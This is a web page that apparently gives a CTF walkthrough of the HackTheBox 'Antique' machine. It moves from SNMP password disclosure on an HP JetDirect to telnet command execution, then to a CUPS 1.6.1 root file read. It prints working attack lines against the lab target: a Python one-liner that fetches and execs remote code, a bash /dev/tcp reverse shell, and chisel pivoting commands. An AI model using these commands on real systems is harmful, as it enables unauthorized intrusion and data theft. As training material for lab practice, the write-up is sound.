@@ -1,0 +1,146 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Antique HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/antique-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-31T16:15:04+00:00">December 31, 2022</time><time class="updated" datetime="2025-06-19T13:37:51+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Antique is Linux machine and is considered an easy box by the hack the box. On this box, we will begin with a basic port scan and move laterally based on the findings. Then we will enumerate telnet service and hunt vulnerabilities present in a particular version.  Laterally, we will exploit password disclosure vulnerability and obtain plain taxed passwords. Then we will be tasked to gain root access where we will need to perform port forwarding then we will read sensitive files by exploiting the file read vulnerability present on CUPS 1.6.1 version. In addition, we will be exploiting privilege and port forwarding using two different techniques.</span></p>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Initial Nmap TCP Port Scan</span></li>
+<li><span style="color: #000000;">Telnet Banner Grabbing</span></li>
+<li><span style="color: #000000;">Searching for the exploit</span></li>
+<li><span style="color: #000000;">SNMP Enumeration</span></li>
+<li><span style="color: #000000;">User Shell</span></li>
+<li><span style="color: #000000;">User Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Port Forwarding with Metasploit</span></li>
+<li><span style="color: #000000;">Finding Privilege Escalation Vectors</span></li>
+<li><span style="color: #000000;">Exploit File read Vulnerability</span></li>
+<li><span style="color: #000000;">Root Flag</span></li>
+<li><span style="color: #000000;"><strong>Manual Method</strong></span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;">Port forwarding with chisel</span></li>
+<li><span style="color: #000000;">Root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">We are going to start the assessment with the normal TCP/IP port scanning.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Initial Nmap TCP Port Scan</strong></span></span></h4>
+<p><span style="color: #000000;">We begin with the port scan where we are using nmap to find out which ports are open and what services are running in the target host. Nmap is a popular port scanning tool come with Kali Linux. To perform a port scan, we have used the –<strong>sV</strong> flag with full TCP ports against the target system which will scan full TCP ports with service version.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;"><strong>-p-</strong>:  Attempts to scan full ports</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV 10.129.33.36</pre>
+<p><span style="color: #000000;">From the nmap scan, we have found telnet is open. Telnet is used to make remote connections. Many of the telnet version are vulnerable and it is not a secured protocol because it does not follow any encryption while communicating and transferring any message from one endpoint to another.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFIctUFkj3h5cjm5oEt8nHXWmc1bVxqMJafrlDu7T-3wzhRyndzStNXzE_ci_fk8onvY5RwNK07oqHn3SAlp0ouoJzYx6veTn6iIqBm44FI2BUPjp_-DjculqqsOnOh_u28tOPhaWWACFESoNKZ8uBn21nK_pSQUE7JhDPkX5tHACr4vsMyPjkYsVIUQ/s16000/1.png"/></strong></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Telnet Banner Grabbing</strong></span></span></h4>
+<p><span style="color: #000000;">While banner grabbing, it has shown an<strong> HP JetDirect </strong>and prompt for the password. By its name, it looks like a printer service which is managed by telnet protocol. Many times, administrators use a common password for the printers but did not work in our case.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYz_zmU7bjhlMmDgCMccIvh4wNUtGSsMu639DKTQr822FIW6nSmkDa0Di4z9Adynf5iRoivg6VIPplT7mgk1XgGENmSDn51KGLSli-aapUg-pqIQRf0064ZtZL7a6rLq2szgWVApQWJaOJnVFazSMYnsPs72_eT6x0jfEuOIguQzV0bF2dbi5TAAk3bg/s16000/2.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Searching for the exploit</strong></span></span></h4>
+<p><span style="color: #000000;">When we searched for the exploit related to HP Jet Direct, we found one exploit available which has a vulnerability to disclosing the device password. We downloaded the exploit and checked the source code we found it works with SNMP protocol.  If we get the device password, then we can enumerate the device via telnet using credentials. But it is only possible if the SNMP protocol is open.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit HP JetDirect
+searchsploit -m 22319
+cat 22319.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLs7ECNQLVwZud3rcywm1NU-m0ZMOCgGavOyUFLAqTFiutAwM9r0ViueF1y9jy16UsWOmJ27ACKf_Hfq5o0dFfODUf8ec9GdZgk9MNWgO1PsLBw4Fxa3iCWkLRPtUuwo7ZejtDBG9Im3ukjxKOs00zElGitn2otCulGWIf5C9ygvVbpL-xfuQ7EGlQxA/s16000/3.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>SNMP Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;">This time, we are scanning only SNMP Service which is works on its default port 161 and follows UDP protocol. From the nmap scan result, we found that SNMP port is open and community name is public which is very common. Also, we found it is using SNMP version 1 which is an insecure version as it does not follow encryption.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sU</strong>:  Attempts to scan UDP ports</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;"><strong>-p</strong>:  Attempts to scan against given port</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sU -sV -p 161 10.129.33.36</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLGB96Bu8fKkrVdaSxquJ8vq4n3p6j0TKU7Xcuoln5VesevmYPIhuilkpXorWXUluC84qINhBz_mdXQJSEU2sIevL7XHFKQ9E8kQNivqs4zgUvE003fa-Mb-q6xMnt-6TxslTbXGNk0yzRgGQKuJ-YhsYoXiaGDlHjEdh9PHpcJC6h7OLnUiaREqILQA/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Next, we are following the exploit we found earlier which gave us some decimal values.  Here we have given target IP address which is 10.129.33.36.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> snmpget -v 1 -c public 10.129.33.36 .1.3.6.1.4.1.11.2.3.9.1.1.13.0</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjsHgjx4VggTNZgZjjL0qQcCuJOs2N1OsX3hw4WUwhqvewQU9SRKVYmAt2HzOhqfnSQl-UvwPqJ9pGQ-Ya-g7lpZCnEpcTDCHg5o1QFkVXHtWQMZA6rL1EVZb4JvZhhyjLl25fdQTr4F2Qb5LjGHh3cwWXNXDxUZeCBjSIjy8_kHs-Bv15b7X5umexdg/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Then, we copied all decimal contents and decoded them using cyberchef. Cyberchef is an online tool used to encode and decode. After decoding we got a plain taxed password:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">P@ssw0rd@123!!123</pre>
+<p><span style="color: #000000;">Reference link: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></strong></span></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcwor_Ej7KDT7oBw46wxe0bfzvntmaI47kDJccuZ6uPhk1kbJeWCoX12ZMzHz63ADBTWZRyQEI6LG7Gs6SXoJhVDDSFHoS2DmXYOYjGgXackOwxRiZlaW1WRZczKD2-ZLCdQiK27giDhTcYTFhqbQArW_tivbZrGQC17ca81AH1tEynePjqxHLyCzJ3A/s16000/10.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>User Shell</strong></span></span></h4>
+<p><span style="color: #000000;">With obtained credentials, we logged in to telnet and used the help command (?). There we saw , we can use <strong>exec</strong> command which means we can execute any system commands from here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWHCvvdubN8nseGEaFTSGcNkFE1AVucVInxBHBsyZ6j0xk8WwX3_sI5r15FY8EuTlMIFf1nW3h-ofsIq7YFkbVDQAi68HcDAQro_PFO8Vd7y-ecNRpuLcIwgKXdTdFiR--mRo4hk2c_7fq3n-H_AxO3KnbQTqvSS9Zq6IAbKBZWcSQZfo9LxTmc6smvw/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Then we used the Metasploit script web delivery module which will create a server and send the payload to receive the reverse shell once the server started, we will use a python reverse shell. Execution of the reverse shell will give us a meterpreter session. To do that we have to provide the srvhost IP address and local host IP address and listening port, but we can skip lport as Metasploit picks it by itself and its default listening port is 4444. Please note, both srvhost and local IP address are the same as our kali machine IP address.  More information about this module is available here:</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/">https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/</a></strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/script/web_delivery
+set lhost 10.10.14.93
+set srvhost 10.10.14.93
+exploit
+python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.14.93:8080/CzrKiV54o7', context=ssl._create_unverified_context());exec(r.read());"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLIAvo6LM7G64c1xKNgGOkE2vpBl6RNU_IsMWXr9b_yOTIq9t5qniaCC6N7R2hWISrk6iiRT7Gx2mwFqSQpZCtgwFIxPMm3LT6q0TCA2xrxVu3GF-LogkegyFcIoNLiHKDAnp-Gnw4_H_pcxZKN2B6nL3Aqhb1thyk_Bc-F7XSL6SlamIc0QurJjWejg/s16000/12.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>User Flag</strong></span></span></h4>
+<p><span style="color: #000000;">As we can see we have received a meterpreter shell. Now we can grab the user flag /var/spool/lpd directory. Also, if the meterpreter session is established then we can interact with the session number, here it is 1. Further enumeration of the internal network, we found an internet printing protocol is running on its default port 631.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP_sPdXTBmS2MRXJfvYOWhfJMFozUXAyamghQOu_8F3C0B4qeSd8ICMD_dYvjuS6Asli60Kzx7XX3-2MCo67GEzmHnyANpozihaiguEVY99b9PbHBqlVhNbua3LNyuwsIxwCQLi6A87gDATAKbOpQ2PI4MuX6ridMe9fDfWi4FXIzGTQbvtv0ZePjf2g/s16000/14.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Privilege escalation is the process of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are usually protected from an application or user. It can be used by attackers to gain access to more system functions and data than intended by the root user. In some cases, privilege escalation can allow attackers to control the system completely.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Port Forwarding with Metasploit</strong></span></span></h4>
+<p><span style="color: #000000;">To enumerate port 631, we will forward its port to our kali system so it will be accessible from there.  Here we have the port number we want to access in our kali loopback interface and the port number we want to forward to our kali system which is 631.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">portfwd add -l 8082 -p 631 -r 127.0.0.1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNBbLNFV-mzf3PAvhHeC14V6bhmbfzVENODhaob_ylc9wwoErMWtGX5waqErMp5S5iGH6Q8kf99Av7phs5L7SPEezIZM53s6FwyEuQPS62KK8S8GmiQRsbJa0av9FVFOkh_6ISn6VOIpcwHQ7ZfAr21sfNImlLeZOeg_2I--2xl5RU3kadubFQdHUyjQ/s16000/15.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Finding Privilege Escalation Vectors</strong></span></span></h4>
+<p><span style="color: #000000;">Accessing it over browser from our kali, opened a web page where we found CUPS version 1.6.1.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHv0GpyNgKKp8Uofp_uDxPKpmtuZpPwdcpIJ2WzQ5pc2ns_OWZZcgMA7-wNWp8o3ml7vyYxMddC0eEGlcb_b0ziBFcM5LPYlBGukYdZfP-Gr8sKHLWaixsNWsezUIiCPB3pYmKGjwUPdfHryynKCTcUPc7fTToBr3dq6Ksm7XEYTmpD5a6MM0NqspicA/s16000/16.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Exploit File read Vulnerability</strong></span></span></h4>
+<p><span style="color: #000000;">The CUPS version 1.6.1 is vulnerable to root file read. We found a Metasploit module that is also available there. Then we switched to the module where we provided the current session ID, and the file name that we want to read, where we have given root.txt.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/escalate/cups_root_file_read
+set session 1
+set file /root/root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiK8Gg00RDtnGqiQzfployFFgvQU7KMKyA6STDEBmnNe4lMkKLg7RgIAZrRZNGA0pf9bf-AgQn9bIJ7VKIVwkZZBfcnP17TTe8QuqjqvzQQLG7mgDu_QAOAqPHTgOO_Yo5QmAUCOG2DnLTjQMMTdSw-LVXJVSzZJ2z3w1pr6-Y2Sz2dUhMcXEhMzaI45Q/s16000/17.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Root flag</strong></span></span></h4>
+<p><span style="color: #000000;">After execution of the exploit, it will save the output to /root/.msf4/loot directory. There we can use the cat command to view the contents of roo.txt. Now we can submit the root flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhu9Y1mAC1JGH_x78ZbYvy8d2RfSnO8kYvAqtUjHc0a5jSjL1072gqzHgJqDInTOt0ZfhwJcsi-UMrXps4B-RMJ-lVO0OKn5F2lB1rqOyf7bTDkAFuClelq1Md9VMa47VUgfnTc5ySsObNOWUObM4RS4kbqrGAMkpqNYudl6O1fxOKiH4kUHzw4Nh93gQ/s16000/18.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Manual Method</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s try with manual way, we will exploit the root file read vulnerability from port forwarding. In many exam settings, we are not allowed to use automated tools, so we also need to consider working in a manual way as well.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Port forwarding with chisel</strong></span></span></h4>
+<p><span style="color: #000000;">For the port forwarding, we need to download the chisel and transfer it to the target machine. Chisel is a great tool used for pivoting and it is used by many penetration testers during their internal assessments. Make sure to download the amd64 architecture only.  The download link is given below:</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKMtUwMEm5bU460mEkFaFjRvueukkR_KfgDJf08NbtqA1myvLNeSXwmKszuFF6fYfIPEBD9wswak9S4ePWRJcJEjwW_BPk0tIG-evL_xTi1AWhDxOOTXGgMD58ZdQRTm8YhkjgsclqKC4z5HzgOAbtiRqkBP0NSJPWysM_DYfI3LId_qjVUhJVYEMbzw/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Once its download, we will unzip it and turn on the python server on port 80 to transfer it to the target system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gunzip chisel_1.7.7_linux_amd64.gz
+python3 -m http.server 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdzGrUeAdiFippltfYFvuMxfjpYLrb19LmbI9QAOJG0nh34qVTD5l2GD7j_EKQl6QbtF3fUB8xzO_OWy0zOeEAH5WvCe__JC0XJwh70Woe9-Gpde3KZE_9h-FlK4o94PPfcWw6p65dxvRoaBNboW6B_6JbNjtELmoO-HMHn_zrDYFemLWtF-LlF440wg/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">We also need to set up a chisel server on our kali system to make them communicate with each other. Firstly, we need to give full permission to execute. Next, we will set up a chisel server on port 5000.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 chisel_1.7.7_linux_amd64.gz
+./ chisel_1.7.7_linux_amd64.gz server -p 5000 --reverse</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuQdtRhsQE79q3Jfi5vuQDlW09k2rrdRJBFREdLYM50HsEZ7YYAGXPI6V-mNIlwXjp2_mpImfKALmNkto4oz4KrTtxCsD6w9NxFhWxn1LGE_Gaz6Xt225QzwbhwdGT9QffKfVOlqJzBIwk6k_EHu6Tbfxj0MMVXyPALzwqL2IOQvAUGfaCrRj4x5PN-Q/s16000/22.png"/></strong></span></p>
+<p><span style="color: #000000;">Then we will take a reverse shell after authenticating via telnet with obtained password: <strong>P@ssw0rd@123!!123. </strong>After logging in to telnet we will take reverse shell using exec command, here we are using bash one-liner reverse shell. Do not forget to turn on the netcat listener on port 1234 before executing the bash one-liner.</span></p>
+<ul>
+<li><span style="color: #000000;">On kali terminal 1:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 10.129.33.36</pre>
+<ul>
+<li><span style="color: #000000;">On kali terminal 2:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Nc -nlvp 1234</pre>
+<ul>
+<li><span style="color: #000000;">On kali terminal 1:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">exec bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.93/1234 0&gt;&amp;1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh18uIROQ48_npR73c5vOOQypj28avizlgUE7dC9wLlUSv7vkk60xpA3iZCaTb_4spUYqo1L7AgKLFRyB8dM1kFGuzBUiJYGQ7CqdgJdzbwj0pWyiwbfPzsB6tOQXeDT7rxqFEGpN4g1e6_Lr1yJOCVgoBY5xa6CkYoi7CEhcuLUU7ptmAjY5Xpt6x4Jw/s16000/23.1.png"/></span></p>
+<p><span style="color: #000000;">Next, we will download chisel in the target systems /tmp folder.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.93/chisel_1.7.7_linux_amd64</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_DLYoDz_bwkLN00gruT-gp8p6bgAfbeacnTGbLemkC8D_PnyVippC-VP85EA2lwVtTgEg-I-KyeiHTnQYHmXX78WKKQOHg9NeN8ER8Ih5Vpxz0R16sThea77h-8nscuyxb32N-lcXfO89JcIxK5_TNsMMor6Z9Lyb5x5XHdJtp4v8_CGr8L5bg6eq3g/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Once we download the chisel on the target system, we will give full permission so we can execute it. Here we need to provide a few details to set up the chisel client such as the attacker Ip address (10.10.14.93), attacker side chisel server port (5000), remote port (5432) where we want to access service than local host and local internal port (631) that we wish to forward.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKjRVRpeCTWDMGlItNfjvNU58hXQ3ITj8b4l8ukRrsT_f_t5uBXaxu4bYsGznxRfng-EtR-oKGt4PAz_nPX3ElzXuEZzerUfkKhltfVpRgOdOH-PU4qT_g3NUpy8y86LANqNe2XznkeFy5nKvBB4MM7PcVFN_1PMvIq4gs0-0E5zRZ8fKQjMKWu-HzGQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">Once we forward the port then we can access it from kali over the browser on loopback IP or localhost on port 5432.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiofBNGXIZZ9uy4U7aGhQnMsKextosp6-qVUlzcmadxre9GunUnY_ML1V2nBmLmB8-CRV3ijRDBE17s8A95NW-zqGcXn1WsF1gnl37h3FBPqedMxPAcPIrkX7dgNA__F9Y3d1Ln6V4V-ARxxtRc0hWzwYGjT37X0QzIHPwtqZhcSnXIfIZEixAIqWM7BQ/s16000/25.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Root Flag</strong></span></span></h4>
+<p><span style="color: #000000;">When we checked groups, we found that current users belong to <strong>lpadmin group</strong>. As cups is accessible from the kali browser, here we are changing the error log path to /root/root.txt.  Once we do that, we can check the root.txt file over the browser. Before changing the error log path, we could be able to see only error logs on the browser but after changing its path we will be able to read any files we wish to read.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicBoFYpXDfuDmKyV9ecD6D1a8UsYoyVlObgS5Am1RsbQTo5qPgWapicNPmfs1xozY82bPQXUtAVj1-j2ayDBZe2taJ-NeNyyPrd3RT2xL5IjNjf5sZyhyP38ZjdRI75HU7tQ8q1HNP1F2f83hyzSV11dF1JHk44QDLPAoAJrD4VFQ7GFzk4lLcUak9pw/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">The error logs are stored in the /admin/log directory. Checking the error log over the browser, we got root.txt content instead of any error. Now we can submit the root flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggG7XQvWKKPZTpPSs_O4CezkAaAMTmlaQQt2afXuFxE1JQZZn4kSHuGaE8AkJ-Czhxku6bmOvUCpRxda-HpeX_xisOHtPxEEmuEkunrmbQyTYMjhIsVf20Nc5cf3gNGaV2Rn420jZUviOQc3l7xfCtvx5F3AP7pdt89mtaPcq2gXaPQpHCvPdfWiUIwA/s16000/28.png"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, service enumeration, UDP port scan, SNMP enumeration, exploit password disclosure vulnerability, port forwarding (Metasploit), Port forwarding (manual), file transfer, file permissions, exploit file read vulnerability to read root.txt file in two different ways.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here</span><strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a> </span></strong>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/subhashpaudel94">Twitter</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
